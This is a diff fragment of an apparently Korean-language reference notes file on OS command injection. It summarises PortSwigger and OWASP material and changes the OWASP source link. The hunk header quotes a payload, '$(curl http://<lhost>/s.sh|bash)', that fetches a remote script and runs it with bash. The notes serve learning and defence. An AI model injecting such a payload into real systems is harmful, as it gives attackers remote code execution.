@@ -37,6 +37,6 @@ $(curl http://<lhost>/s.sh|bash)
 - 요약: OS command injection In this section, we explain what OS command injection is, and describe how vulnerabilities can be detected and exploited. We also show you some useful commands and techniques for different operating systems, and describe how to prevent OS command injection. Labs If you're familiar with the basic concepts behind OS command injection vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from t
 
 ### OWASP Command Injection
-- 출처: https://owasp.org/www-community/attacks/Command_Injection
+- 출처: https://community.owasp.org/attacks/Command_Injection
 - 승격일: 2026-10-07
 - 요약: Command Injection Description Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible large
